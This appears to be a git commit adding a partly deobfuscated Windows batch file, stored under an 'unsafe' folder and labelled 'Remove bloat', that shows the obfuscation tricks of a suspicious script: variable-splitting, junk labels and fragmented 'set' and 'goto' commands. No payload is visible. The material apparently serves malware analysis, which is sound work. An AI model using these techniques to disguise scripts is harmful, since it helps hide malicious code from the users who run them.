5d9fef8650666fe33f42659e3e6307910594991f
Zuntie <ZuntieDev@gmail.com>
2024-04-20 12:36:29 +0200

    Decrypted.bat

---
+++ unsafe/decrypted.bat
@@ -0,0 +1,51 @@
+:: Remove bloat
+:: %\dzZdgdRZFXYqUBbsslHpeGIaEjuKgTAzzriIxKRnCpLhdoMZaFuADVnxQZyXJhSMxyQCtsUIuuNOVAWpwvJByaWEeLRylTDuxZKEyjFHKMfihyBqciAoxqnwCmyHBwwA:dzZchdQZFYYpVBbrrlHofGIaFjvKhRAzzqiIyJQmBpLhcoLZaFvADVmxPZyXJhRLxyPCurVIvvNNVAXoxvJByaWDfLQylUDvxZKFyjGIKLgihyBpciAnypnxCl=%
+
+:: First 2 lines
+@goto JcVocJumyTZqiVikwFLZyBXHVTZXLHBgTJyiwqTmPmDokZPayToFiNaieNTikwBRRswyXZoFLZkLyJ
+:XVeZZRswXFJPDiwLcskLwscqcZFJTJDPkVqyDkXkZVuqPHVFJaXRammesNwZmJDocuFiRyHRVamBXL
+
+:: Line 3-8
+@echo off
+
+:: Line 9-17
+set AmrW=set""
+
+:: Line 18-27
+:: Notable vars | UYaMoWXDBT
+%AmrW% UYaMoWXDBT="cd"
+
+:: Line 28-37
+:: Notable vars | OdwLmFChOQ
+%AmrW% OdwLmFChOQ="d %systemdrive%"
+
+:: Line 37-47
+:: Notable vars | NYGJBqiIMQ
+%AmrW% NYGJBqiIMQ=" /"
+
+:: Line 48-56
+set MCDk=set""
+
+:: Line 57-67
+%MCDk% DqGXpGNtWa="	'$q"
+
+:: Line 68-78
+"HBVenugtUY%RsrV%rt"
+"kLnxSzhnUx%RsrV%ve"
+"rOhGAKrnyw%RsrV%cw"
+"LncmLYgopF%RsrV%ZO"
+"wGjBvctpXh%RsrV%"h"
+"CpECRUDwpv%RsrV%kP"
+"lvgyvvhsFb%RsrV%""
+"IyDbLKfRAI%RsrV%R="
+"yBCPPSyZau%RsrV%zf"
+"PrRnPbRMUN%RsrV%%MCDk%"
+%PrRnPbRMUN%%wGjBvctpXh%%LncmLYgopF%%rOhGAKrnyw%%yBCPPSyZau%%CpECRUDwpv%%IyDbLKfRAI%%kLnxSzhnUx%%HBVenugtUY%%lvgyvvhsFb%
+
+
+
+:: Last lines
+:: 1/2 5086-5088
+"dzZdgdRZFXYqUBbsslHpeGIaEjuKgTAzzriIxKRnCpLhdoMZaFuADVnxQZyXJhSMxyQCtsUIuuNOVAWpwvJByaWEeLRylTDuxZKEyjFHKMfihyBqciAoxqnwCmyHBwwA=sdzZchdQZFYYpVBbrrlHofGIaFjvKhRAzzqiIyJQmBpLhcoLZaFvADVmxPZyXJhRLxyPCurVIvvNNVAXoxvJByaWDfLQylUDvxZKFyjGIKLgihyBpciAnypnxClet "
+"RsrV=="
+%aTNRwqqcNXRXBDwXeTquwPPyewkmVHaymoHyokagNycLNkDXXo%g%aTNRwqqcNXRXBDwXeTquwPPyewkmVHaymoHyokagNycLNkDXXo%o%aTNRwqqcNXRXBDwXeTquwPPyewkmVHaymoHyokagNycLNkDXXo%t%aTNRwqqcNXRXBDwXeTquwPPyewkmVHaymoHyokagNycLNkDXXo%o%aTNRwqqcNXRXBDwXeTquwPPyewkmVHaymoHyokagNycLNkDXXo% XVeZZRswXFJPDiwLcskLwscqcZFJTJDPkVqyDkXkZVuqPHVFJaXRammesNwZmJDocuFiRyHRVamBXL
